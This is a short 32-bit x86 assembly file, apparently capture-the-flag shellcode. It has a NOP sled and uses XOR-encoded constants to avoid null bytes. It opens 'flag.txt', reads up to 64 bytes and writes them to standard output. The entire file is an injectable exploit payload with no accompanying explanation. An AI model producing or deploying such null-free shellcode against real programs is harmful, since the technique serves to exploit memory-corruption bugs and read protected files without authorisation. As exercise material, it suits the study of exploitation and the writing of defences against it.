.section .text

nop
nop
nop
nop
nop
nop
xor %eax, %eax
push %eax
mov $0x11111115, %eax
xor $0x11111110, %eax
push $0x7478742e
push $0x67616c66
push %esp
pop %ebx
xor %ecx, %ecx
int $0x80

sub $0x40, %esp
mov %eax, %ebx
mov %esp, %ecx
mov $0x11111141, %edx
xor $0x11111101, %edx
mov $0x11111113, %eax
xor $0x11111110, %eax
int $0x80

mov %eax, %edx
mov $0x11111114, %eax
xor $0x11111110, %eax
mov $0x11111111, %ebx
xor $0x11111110, %ebx
int $0x80
nop
nop
nop
nop
